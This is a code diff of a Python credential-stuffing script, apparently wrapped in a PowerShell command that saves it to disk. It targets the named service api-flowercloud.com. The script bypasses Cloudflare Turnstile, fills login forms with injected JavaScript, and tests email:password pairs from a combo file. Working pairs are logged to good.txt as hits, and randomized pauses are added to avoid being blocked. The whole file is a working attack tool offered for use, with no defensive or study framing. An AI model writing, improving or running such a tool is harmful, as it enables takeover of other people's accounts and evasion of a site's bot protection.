@@ -1,9 +1,7 @@
-@"
-"""
-花云 CF 绕过 + 批量登录验证 (最终修正版)
-安装: pip install DrissionPage
-运行前: taskkill /F /IM chrome.exe /T
-"""
+# -*- coding: utf-8 -*-
+# 花云 CF + 批量登录 (高速版)
+# 安装: pip install DrissionPage
+# 运行前: taskkill /F /IM chrome.exe /T
 
 import sys
 import os
@@ -16,40 +14,33 @@ except ImportError:
     print("[!] pip install DrissionPage")
     sys.exit(1)
 
+# 配置
 TARGET_BASE = "https://api-flowercloud.com"
-LOGIN_PAGE = TARGET_BASE + "/index.php?rp=/login"
+TARGET_PAGE = TARGET_BASE + "/clientarea.php"
 COMBO_FILE = "combo_f.txt"
 GOOD_FILE = "good.txt"
 BAD_FILE = "bad.txt"
 MAX_CF_WAIT = 120
-DELAY_BETWEEN = 3
 CHROME_PATH = None
 
 def find_browser():
-    paths = [r"C:\Program Files\Google\Chrome\Application\chrome.exe",r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",r"C:\Program Files\Microsoft\Edge\Application\msedge.exe"]
+    paths = [
+        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
+        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
+        r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
+        r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
+    ]
     for p in paths:
         if os.path.exists(p):
             return p
     return None
 
-def is_challenge_page(page):
+def page_is_ready(page):
     try:
-        url = page.url.lower() if page.url else ""
-        title = page.title.lower() if page.title else ""
-        if "api-flowercloud.com" in url and ("clientarea" in url or "index.php" in url or "cart.php" in url):
-            return False
-        signs = ["just a moment", "checking your browser", "attention required"]
-        if any(s in title for s in signs):
-            return True
-        try:
-            html_head = page.html[:1500].lower() if page.html else ""
-            if "cf-chl-widget" in html_head or "challenge-platform" in html_head:
-                return True
-        except:
-            pass
-        return False
+        html = page.html if page.html else ""
+        return len(html) > 10000
     except:
-        return True
+        return False
 
 def try_click_turnstile(page):
     try:
@@ -65,7 +56,7 @@ def try_click_turnstile(page):
     except:
         pass
     try:
-        cf_div = page.ele("css:.cf-turnstile", timeout=2)
+        cf_div = page.ele("css:.cf-turnstile", timeout=1)
         if cf_div:
             cf_div.click()
             return True
@@ -73,115 +64,57 @@ def try_click_turnstile(page):
         pass
     return False
 
-def wait_cf(page, max_wait=MAX_CF_WAIT):
+def wait_page_ready(page, max_wait=MAX_CF_WAIT):
     start = time.time()
     while time.time() - start < max_wait:
-        if not is_challenge_page(page):
+        if page_is_ready(page):
             return True
         try_click_turnstile(page)
         elapsed = int(time.time() - start)
         if elapsed % 10 == 0 and elapsed > 0:
             print("    ... CF (" + str(elapsed) + "s)")
-        time.sleep(3)
-    return not is_challenge_page(page)
+        time.sleep(2)
+    return page_is_ready(page)
 
-def goto_and_pass_cf(page, url):
-    page.get(url)
-    time.sleep(3)
-    if is_challenge_page(page):
-        print("    [*] CF...")
-        passed = wait_cf(page)
-        if passed:
-            print("    [+] CF OK")
-            time.sleep(2)
-            return True
-        else:
-            print("    [!] CF timeout")
-            return False
-    return True
-
-def do_login(page, email, password):
-    if not goto_and_pass_cf(page, LOGIN_PAGE):
-        return "error"
-    time.sleep(3)
+def do_login_fast(page, email, password):
+    # 用JS直接填表单并提交，比模拟点击快得多
+    # 构造JS：找到表单，填值，提交
+    js_fill_and_submit = """
+    var emailBox = document.querySelector('#inputEmail') || document.querySelector('input[name="username"]') || document.querySelector('input[type="email"]');
+    var passBox = document.querySelector('#inputPassword') || document.querySelector('input[name="password"]') || document.querySelector('input[type="password"]');
+    if(emailBox && passBox) {
+        emailBox.value = arguments[0];
+        passBox.value = arguments[1];
+        // 触发input事件让框架识别
+        emailBox.dispatchEvent(new Event('input', {bubbles:true}));
+        passBox.dispatchEvent(new Event('input', {bubbles:true}));
+        // 找表单提交
+        var form = emailBox.closest('form');
+        if(form) {
+            form.submit();
+            return 'submitted';
+        }
+        // 没表单就找按钮
+        var btn = document.querySelector('input[type="submit"]') || document.querySelector('button[type="submit"]');
+        if(btn) {
+            btn.click();
+            return 'clicked';
+        }
+        return 'no_form_no_btn';
+    }
+    return 'no_input';
+    """
     try:
-        email_input = None
-        for sel in ['#inputEmail', 'input[name="username"]', 'input[type="email"]', 'input[name="email"]']:
-            try:
-                email_input = page.ele(sel, timeout=5)
-                if email_input:
-                    break
-            except:
-                continue
-        if not email_input:
-            print("    [!] no email input, url=" + str(page.url)[:60])
-            return "error"
-        pass_input = None
-        for sel in ['#inputPassword', 'input[name="password"]', 'input[type="password"]']:
-            try:
-                pass_input = page.ele(sel, timeout=3)
-                if pass_input:
-                    break
-            except:
-                continue
-        if not pass_input:
-            print("    [!] no pass input")
-            return "error"
-        email_input.click()
-        time.sleep(0.2)
-        email_input.input("", clear=True)
-        time.sleep(0.1)
-        email_input.input(email)
-        time.sleep(0.3)
-        pass_input.click()
-        time.sleep(0.2)
-        pass_input.input("", clear=True)
-        time.sleep(0.1)
-        pass_input.input(password)
-        time.sleep(0.5)
-        btn = None
-        for sel in ['input[type="submit"]', 'button[type="submit"]', '#login', '.btn-primary[type="submit"]']:
-            try:
-                btn = page.ele(sel, timeout=2)
-                if btn:
-                    break
-            except:
-                continue
-        if btn:
-            btn.click()
-        else:
-            pass_input.input("{ENTER}")
-        time.sleep(5)
-        if is_challenge_page(page):
-            wait_cf(page, 60)
-            time.sleep(3)
-        final_url = page.url if page.url else ""
-        if "incorrect" in final_url.lower():
-            return "bad"
-        if "clientarea.php" in final_url.lower() and "incorrect" not in final_url.lower() and "login" not in final_url.lower():
-            return "good"
-        try:
-            page_html = page.html.lower() if page.html else ""
-            if "logout.php" in page_html:
-                return "good"
-            if "incorrect" in page_html or "invalid" in page_html:
-                return "bad"
-        except:
-            pass
-        return "bad"
-    except Exception as e:
-        print("    [!] " + str(e))
-        return "error"
-
-def save_result(filename, content):
-    f = open(filename, "a", encoding="utf-8")
-    f.write(content)
-    f.write(os.linesep)
-    f.close()
+        result = page.run_js(js_fill_and_submit, email, password)
+        return result
+    except:
+        return "js_error"
 
 def main():
     print("")
-    print("  花云 CF + 批量登录")
+    print("  =============================================")
+    print("    花云 CF + 批量登录 (高速版)")
+    print("  =============================================")
     print("")
     if not os.path.exists(COMBO_FILE):
         print("[!] no " + COMBO_FILE)
@@ -192,14 +125,15 @@ def main():
     if not lines:
         print("[!] combo empty")
         sys.exit(1)
-    print("[+] " + str(len(lines)) + " accounts")
+    print("[+] " + str(len(lines)) + " accounts loaded")
     global CHROME_PATH
     if not CHROME_PATH:
         CHROME_PATH = find_browser()
     if not CHROME_PATH:
-        print("[!] no browser")
+        print("[!] no browser found")
         sys.exit(1)
-    print("[+] " + CHROME_PATH)
+    print("[+] browser: " + CHROME_PATH)
+    print("[*] starting browser...")
     co = ChromiumOptions()
     co.set_browser_path(CHROME_PATH)
     co.set_argument("--start-maximized")
@@ -210,25 +144,33 @@ def main():
         page = ChromiumPage(co)
     except Exception as e:
         print("[!] " + str(e))
-        print("run: taskkill /F /IM chrome.exe /T")
+        print("[*] run: taskkill /F /IM chrome.exe /T")
         sys.exit(1)
     print("[+] browser OK")
-    print("[*] first visit...")
-    page.get(TARGET_BASE + "/clientarea.php")
+    # 首次过CF
+    print("[*] opening " + TARGET_PAGE)
+    page.get(TARGET_PAGE)
     time.sleep(5)
-    if is_challenge_page(page):
-        print("[*] CF detected, clicking...")
-        passed = wait_cf(page)
-        if not passed:
-            print("[!] auto failed, click manually then press Enter")
-            input()
     page_size = len(page.html) if page.html else 0
-    print("[+] page size: " + str(page_size))
-    if page_size < 5000:
-        print("[!] too small, click CF manually then Enter")
-        input()
-    print("[+] CF passed, starting login")
+    print("[*] current page size: " + str(page_size) + " bytes")
+    if not page_is_ready(page):
+        print("[*] CF challenge detected, waiting...")
+        passed = wait_page_ready(page)
+        if not passed:
+            print("[!] auto CF failed")
+            print("[*] click turnstile in Chrome, then press Enter")
+            input()
+            time.sleep(5)
+            if not page_is_ready(page):
+                print("[!] still not ready")
+                page.quit()
+                sys.exit(1)
+    page_size = len(page.html) if page.html else 0
+    print("[+] CF passed! page size: " + str(page_size) + " bytes")
+    print("")
+    print("[+] starting batch login...")
     print("=" * 50)
+    print("")
     good = 0
     bad = 0
     err = 0
@@ -240,31 +182,105 @@ def main():
         email = parts[0].strip()
         password = parts[1].strip()
         print("[" + str(i+1) + "/" + str(total) + "] " + email)
-        result = do_login(page, email, password)
-        if result == "good":
-            good += 1
-            print("    >>> HIT <<<")
-            save_result(GOOD_FILE, line)
-        elif result == "bad":
+        # 确保在登录页
+        current_url = page.url if page.url else ""
+        if "incorrect" in current_url:
+            # 上一个失败后停在了 incorrect 页面，回到登录页
+            page.get(TARGET_PAGE)
+            time.sleep(2)
+            if not page_is_ready(page):
+                wait_page_ready(page, 30)
+        elif "logout" in current_url or ("clientarea" in current_url and "incorrect" not in current_url):
+            # 检查是否还有登录表单
+            has_form = page.run_js("return !!(document.querySelector('#inputEmail') || document.querySelector('input[name=\"username\"]'))")
+            if not has_form:
+                # 已登录状态，需要退出
+                page.get(TARGET_BASE + "/logout.php")
+                time.sleep(2)
+                page.get(TARGET_PAGE)
+                time.sleep(2)
+                if not page_is_ready(page):
+                    wait_page_ready(page, 30)
+        # 用JS快速填表单并提交
+        submit_result = do_login_fast(page, email, password)
+        if submit_result == "no_input":
+            print("    [!] no input found, reloading...")
+            page.get(TARGET_PAGE)
+            time.sleep(3)
+            if not page_is_ready(page):
+                wait_page_ready(page, 30)
+            submit_result = do_login_fast(page, email, password)
+            if submit_result == "no_input":
+                print("    [!] still no input")
+                err += 1
+                print("    !!! ERR !!!")
+                save_result(BAD_FILE, line)
+                print("    [H:" + str(good) + " B:" + str(bad) + " E:" + str(err) + "]")
+                print("")
+                continue
+        if submit_result == "js_error":
+            err += 1
+            print("    !!! ERR (js) !!!")
+            save_result(BAD_FILE, line)
+            print("    [H:" + str(good) + " B:" + str(bad) + " E:" + str(err) + "]")
+            print("")
+            continue
+        # 等待跳转完成
+        time.sleep(3)
+        # 如果跳转后又碰到CF
+        if not page_is_ready(page):
+            wait_page_ready(page, 30)
+            time.sleep(1)
+        # 判断结果
+        final_url = page.url if page.url else ""
+        final_lower = final_url.lower()
+        # 也看页面内容
+        try:
+            page_html = page.html.lower() if page.html else ""
+        except:
+            page_html = ""
+        if "incorrect" in final_lower or "incorrect" in page_html:
             bad += 1
             print("    --- BAD ---")
             save_result(BAD_FILE, line)
+        elif "logout.php" in page_html:
+            good += 1
+            print("    >>> HIT <<<")
+            save_result(GOOD_FILE, line)
+            # 退出登录
+            page.get(TARGET_BASE + "/logout.php")
+            time.sleep(2)
+            page.get(TARGET_PAGE)
+            time.sleep(2)
+            if not page_is_ready(page):
+                wait_page_ready(page, 30)
         else:
-            err += 1
-            print("    !!! ERR !!!")
+            bad += 1
+            print("    --- BAD ---")
             save_result(BAD_FILE, line)
         print("    [H:" + str(good) + " B:" + str(bad) + " E:" + str(err) + "]")
-        if i < total - 1:
-            time.sleep(random.uniform(DELAY_BETWEEN, DELAY_BETWEEN + 2))
-        if (i + 1) % 50 == 0:
-            p = random.uniform(10, 20)
-            print("[*] pause " + str(int(p)) + "s...")
+        print("")
+        # 短暂延迟防止太快被封
+        time.sleep(random.uniform(0.5, 1.5))
+        # 每100个暂停
+        if (i + 1) % 100 == 0:
+            p = random.uniform(5, 10)
+            print("[*] pause " + str(int(p)) + "s after 100...")
             time.sleep(p)
     print("=" * 50)
-    print("  DONE! H:" + str(good) + " B:" + str(bad) + " E:" + str(err))
-    print("  " + GOOD_FILE + " / " + BAD_FILE)
+    print("  DONE!")
+    print("  HIT:   " + str(good) + " -> " + GOOD_FILE)
+    print("  BAD:   " + str(bad) + " -> " + BAD_FILE)
+    print("  ERROR: " + str(err))
+    print("  TOTAL: " + str(total))
+    print("=" * 50)
     page.quit()
+
+def save_result(filename, content):
+    f = open(filename, "a", encoding="utf-8")
+    f.write(content)
+    f.write(os.linesep)
+    f.close()
 
 if __name__ == "__main__":
     main()
-"@ | Out-File -FilePath "C:\Users\Administrator\Downloads\CloudflareBypassForScraping-main\flower_bypass.py" -Encoding utf8
